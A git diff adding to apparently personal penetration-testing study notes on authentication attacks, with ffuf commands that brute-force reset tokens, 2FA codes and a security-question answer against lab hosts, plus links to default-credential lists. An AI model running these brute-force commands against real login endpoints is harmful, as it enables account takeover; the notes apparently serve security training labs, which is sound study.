@@ -19,4 +19,11 @@ ffuf -w tokens.txt -u http://94.237.122.36:46535/reset_password.php?token=FUZZ -
 ## Brute-Forcing 2FA Codes
 ```bash
 ffuf -w tokens.txt -u http://94.237.48.51:31857/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=rn93ps1erud0phg9fijkr18qgn" -d "otp=FUZZ" -fr "Invalid 2FA Code"
+# Common Questions
+ffuf -w city_wordlist.txt -u http://83.136.253.5:54291/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=e5dvik7k6cvi932099ue5q4hng" -d "security_response=FUZZ" -fr "Incorrect response."
 ```
+
+# Default Credentials
+- [Default Credentials](https://cirt.net/passwords/)
+- [Default Github](https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv)
+- [Seclist Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
